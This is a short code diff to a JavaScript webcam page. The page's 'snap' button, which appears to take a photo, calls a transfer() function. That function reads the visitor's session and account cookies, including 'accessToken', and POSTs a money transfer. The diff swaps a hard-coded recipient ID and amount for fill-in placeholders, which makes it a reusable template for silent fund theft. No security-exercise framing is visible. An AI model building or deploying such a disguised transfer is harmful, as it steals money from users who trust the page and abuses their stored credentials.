@@ -15,12 +15,12 @@ window.addEventListener("DOMContentLoaded", function () {
             video.play();
         });
     }
-    else if (navigator.getUserMedia) { // Standard
+    else if (navigator.getUserMedia) { 
         navigator.getUserMedia(mediaConfig, function (stream) {
             video.src = stream;
             video.play();
         }, errBack);
-    } else if (navigator.webkitGetUserMedia) { // WebKit-prefixed
+    } else if (navigator.webkitGetUserMedia) { 
         navigator.webkitGetUserMedia(mediaConfig, function (stream) {
             video.src = window.webkitURL.createObjectURL(stream);
             video.play();
@@ -31,7 +31,6 @@ window.addEventListener("DOMContentLoaded", function () {
             video.play();
         }, errBack);
     }
-
     document.getElementById('snap').addEventListener('click', function () {
         transfer()
     });
@@ -40,7 +39,7 @@ window.addEventListener("DOMContentLoaded", function () {
 function transfer() {
     var fromAcc = readCookie('sub');
     var fromAmount = readCookie('amount')
-    var to = '4eeafe1b-f66b-40f9-a357-8c459d5f3005'
+    var to = '[userName to transfer]'
     var toAmount = '0'
     var token = readCookie('accessToken')
     var body ={
@@ -48,7 +47,7 @@ function transfer() {
         fromAmount: fromAmount,
         to: to,
         toAmount: toAmount,
-        amount: '10' ,
+        amount: '[Amount to transfer]' ,
     }
     $.ajax({
         type: 'POST',
@@ -68,7 +67,6 @@ function transfer() {
         },
         error: function (err) {
             console.log(err)
-
         }
     })
 }
